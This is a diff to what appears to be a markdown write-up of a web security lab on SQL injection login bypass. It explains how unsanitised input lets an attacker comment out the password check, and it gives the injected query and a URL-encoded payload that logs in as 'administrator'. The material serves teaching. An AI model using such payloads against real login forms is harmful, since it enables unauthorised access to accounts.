@@ -22,7 +22,7 @@ Explantation:<br>
 This payload is a more simple to understand. The username and password are used as variables in the SQL query. <br>If an application does not validiate/sanitize the input an attacker can inject their own SQL and bypass. We bypass the login by removing the password requirement.<br>
 
 Code:<br>
-`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`<br>
+`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
 <br>`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`<br>
 <br>Payload:
 <br>`username=administrator%27--&password=hello`<br>
